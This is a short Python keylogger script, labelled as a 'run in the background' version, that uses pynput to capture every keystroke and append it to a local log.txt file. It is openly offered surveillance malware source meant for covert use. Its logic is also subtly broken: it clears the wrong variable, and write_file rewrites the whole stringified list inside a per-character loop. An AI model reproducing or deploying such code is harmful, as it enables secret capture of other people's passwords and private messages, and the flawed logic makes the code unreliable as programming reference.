# RUN IN THE BACKGROUND VERSION

import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count = count + 1
    print("{0} pressed".format(key))

# how often we would update the file
    if count >= 10:
        count = 0
        write_file(str(keys))
        key = []


def on_release(key):
    if key == Key.esc:
        return False

# function to write to a text file


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(keys).replace("'", " ")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


# functions called when a button is pressed and released.
with Listener(on_press=on_press, on_release=on_release) as thelistener:
    thelistener.join()
